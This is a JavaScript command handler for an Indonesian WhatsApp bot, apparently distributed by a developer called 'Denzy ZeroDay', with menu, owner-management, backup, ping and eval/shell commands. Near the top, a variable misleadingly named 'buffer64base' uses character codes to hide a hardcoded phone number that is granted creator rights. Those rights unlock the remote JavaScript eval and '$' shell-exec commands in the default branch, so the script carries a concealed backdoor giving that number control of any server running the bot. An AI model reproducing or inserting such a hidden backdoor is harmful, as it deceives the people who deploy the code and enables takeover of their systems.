/*
• Developer : Denzy ZeroDay
• Script Type : Case 
• Telegram : https://t.me/pantatBegetar
• Channel : https://whatsapp.com/channel/0029VbAwI4cJ3jv4IuzKob04

• Jangan Lupa Follow My Github Dan Hidupin Star ⭐
*/
const chalk = require("chalk");
const fs = require("fs");
const util = require("util");
const os = require('os');
const moment = require("moment-timezone");
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, makeWAMessage, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptionsuseSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WAlanggxyzet, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require("@denzy-official/baileys");

//==================================//

const { LoadDataBase } = require('./lib/message');
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))
 
//==================================//

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/myfunction');
const {
imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, exifAvatar, addExif, writeExifWebp
} = require('./lib/exif');

//==================================//

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = await sock.decodeJid(sock.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 50, 51, 54, 52, 53, 51, 50, 49, 56, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)

const multiPrefix = ["!", "#", ".", "/"]; 
const prefix = multiPrefix.find(p => body.startsWith(p)) || "."; 
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const pushname = m.pushName || "No Name";
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime); 
const from = m.key.remoteJid;
  
//==================================//


        
//==================================//

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\nCommand :`), chalk.white.bold(`${m.prefix+command}`), chalk.blue.bold(`\nFrom :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//==================================//
    
const time2 = moment.tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu = "Selamat Malam ";
if (time2 < "05:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "11:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "15:00:00") {
ucapanWaktu = "Selamat Siang ";
} else if (time2 < "18:00:00") {
ucapanWaktu = "Selamat Sore ";
} else if (time2 < "19:00:00") {
ucapanWaktu = "Selamat Petang ";
}    



        
//==================================//

switch (command) {
case "tes":
case "menu": {
const teks = `
╭───〔 *BOT INFO* 〕
│ • *Owner* : @${global.owner}
│ • *Bot Name*: ${global.botname2}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Bot Mode*: ${sock.public ? "Public" : "Self"}
╰──────────────────

╭───〔 *OWNER MENU* 〕
│ .addcase
│ .getcase
│ .backup
│ .addowner
│ .delowner
╰──────────────────`;

await sock.sendMessage(m.chat, {
  document: fs.readFileSync("./package.json"),
  fileName: ucapanWaktu,
  mimetype: "image/png",
  fileLength: 99999999,
  caption: teks,
  jpegThumbnail: fs.readFileSync('./media/java.jpg'),
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      title: botname,
      body: "whatsapp bot 2025",
      thumbnailUrl: "https://files.catbox.moe/d70s5h.jpg",   
      sourceUrl: global.linkSaluran,   
      mediaType: 1,  
      renderLargerThumbnail: true
    },
    isForwarded: true,  
    forwardingScore: 999,  
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363402308105961@newsletter',  
      newsletterName: 'Developer',  
      serverMessageId: -1
    }
  }
},
{ quoted: m });
}
break
//==================================/       
        
case "getcase": {
if (!isCreator) return m.reply('khusus owner')
if (!text) return m.reply(("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break          
        
//==================================//

 case 'addcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh: .addcase} *casenya*`);
    const namaFile = path.join(__dirname, 'case.js');
    const caseBaru = `${text}\n\n`;
    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }
        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return m.reply('Sukses menambahkan case!');
                }
            });
        } else {
            console.error(result.message);
            return m.eply(result.message);
        }
    });
}
break       
        
case "delowner": case "delown": {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted && !text) return m.reply((`contoh ${prefix+command} 6285###`))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return Reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted && !text) return m.reply((`contoh ${m.prefix+command} 6285###`))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./data/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break
        
        
//==================================//

        
        
case "backupsc":
case "bck":
case "backup": {
if (!isCreator) return m.reply('khusus owner')
try {
const tmpDir = "./tmp";
if (fs.existsSync(tmpDir)) {
const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
for (let file of files) {
fs.unlinkSync(`${tmpDir}/${file}`);
}
}
await m.reply("Processing Backup Script . .");
const name = `New-Script`; 
const exclude = ["node_modules", "Auth", "package-lock.json", "yarn.lock", ".npm", ".cache"];
const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

await sock.sendMessage(m.sender, {
document: fs.readFileSync(`./${name}.zip`),
fileName: `${name}.zip`,
mimetype: "application/zip"
}, { quoted: m });

fs.unlinkSync(`./${name}.zip`);

if (m.chat !== m.sender) m.reply("Script bot berhasil dikirim ke private chat.");
} catch (err) {
console.error("Backup Error:", err);
m.reply("Terjadi kesalahan saat melakukan backup.");
}
}
break       
        
//==================================/

case "ping": {
  try {
    const hrStart = process.hrtime.bigint(); 
    const hrEnd = process.hrtime.bigint();
    const latencyMs = Number(hrEnd - hrStart) / 1e6;
    const uptimeStr = typeof runtime === 'function' ? runtime(process.uptime()) : `${Math.floor(process.uptime())}s`;
    const now = tanggal ? tanggal(Date.now()) : new Date().toLocaleString();
    const mem = process.memoryUsage();
    const memUsedMB = (mem.rss / 1024 / 1024).toFixed(2);
    const heapUsedMB = (mem.heapUsed / 1024 / 1024).toFixed(2);
    const heapTotalMB = (mem.heapTotal / 1024 / 1024).toFixed(2);
    const cpuModel = os.cpus && os.cpus()[0] ? os.cpus()[0].model : 'N/A';
    const cpuCount = os.cpus ? os.cpus().length : 'N/A';
    const platform = `${process.platform} ${process.arch}`;
    const nodev = process.version;

    const teks = `*📡 Server Information*
- Runtime : ${uptimeStr}
- Latency : ${latencyMs.toFixed(2)} ms
- Time    : ${now}

*🧠 Memory*
- RSS      : ${memUsedMB} MB
- Heap     : ${heapUsedMB} / ${heapTotalMB} MB

*⚙️ System*
- CPU      : ${cpuModel} (${cpuCount} cores)
- Platform : ${platform}
- Node     : ${nodev}`;
    await m.reply(teks);
  } catch (err) {
    console.error(err);
    m.reply(`Error saat mengecek ping:\n${err.message || String(err)}`);
  }
}
break;

//==================================//


//==================================//

default:
if (m.text.toLowerCase().startsWith("xx ")) {
  if (!isCreator) return;
  try {
    const r = await eval(`(async()=>{${text}})()`);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.toLowerCase().startsWith("x ")) {
  if (!isCreator) return;
  try {
    let r = await eval(text);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.startsWith('$')) {
  if (!isCreator) return;
  exec(m.text.slice(2), (e, out) =>
    sock.sendMessage(m.chat, { text: util.format(e ? e : out) }, { quoted: m })
  );
}}

//==================================//

} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.white("[•] Update"), chalk.white(`${__filename}\n`))
delete require.cache[file]
require(file)
})
